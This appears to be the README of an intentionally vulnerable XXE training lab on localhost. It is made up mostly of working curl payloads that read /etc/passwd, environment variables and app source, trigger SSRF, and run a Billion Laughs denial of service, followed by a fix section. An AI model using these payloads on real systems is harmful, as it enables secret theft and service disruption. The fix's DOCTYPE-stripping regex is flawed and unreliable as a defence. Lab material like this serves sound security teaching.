# Lab 11 — XXE (XML External Entity) Injection 🔴🔴

**Port:** `8011`  
**Stack:** Node.js + PostgreSQL | **Swagger:** `http://localhost:8011/api-docs`  
**Difficulty:** Intermediate–Advanced

---

## 🕳️ Security Loopholes

1. **Entity Processing Enabled** — XML parser resolves `<!ENTITY>` declarations including `SYSTEM` entities
2. **`file://` Protocol Supported** — Reads arbitrary files from the server filesystem
3. **HTTP External Entities** — Can trigger SSRF via `<!ENTITY SYSTEM "http://...">`
4. **Parsed Data Returned** — Resolved entity content echoed back in response

---

## 🎯 Attack Scenarios

### Scenario A — Read /etc/passwd
```bash
docker compose up -d

curl -X POST http://localhost:8011/invoice/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <customer>&xxe;</customer>
  <amount>100</amount>
</invoice>'
```

### Scenario B — Read App Secrets
```bash
# Read environment / app source
curl -X POST http://localhost:8011/invoice/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<invoice><customer>&xxe;</customer><amount>1</amount></invoice>'

# Read Node.js app source
curl -X POST http://localhost:8011/invoice/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/app.js">
]>
<invoice><customer>&xxe;</customer><amount>1</amount></invoice>'
```

### Scenario C — SSRF via XXE
```bash
# Trigger outbound HTTP request from server
curl -X POST http://localhost:8011/invoice/validate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/">
]>
<root>&xxe;</root>'
```

### Scenario D — Billion Laughs DoS
```bash
curl -X POST http://localhost:8011/invoice/validate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>'
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `curl` | Manual XML payload delivery |
| Burp Suite | XML content-type interception |
| `XXEinjector` | `ruby XXEinjector.rb --host=localhost --port=8011 --path=/invoice/upload` |
| `nuclei` | `nuclei -t vulnerabilities/xxe/` |

---

## 🔐 How to Fix

```javascript
// 1. Use a parser with external entities DISABLED
const { XMLParser } = require('fast-xml-parser');
const safeParser = new XMLParser({
  processEntities: false,   // ← disable entity processing
  allowBooleanAttributes: true,
});

// 2. Strip DOCTYPE declarations before parsing
const stripDoctype = (xml) => xml.replace(/<!DOCTYPE[^>]*>/gi, '');

// 3. Validate Content-Type strictly
// 4. Consider rejecting XML entirely — use JSON instead
// 5. If XML is required, use a safe parser like defusedxml (Python) or equivalent
```
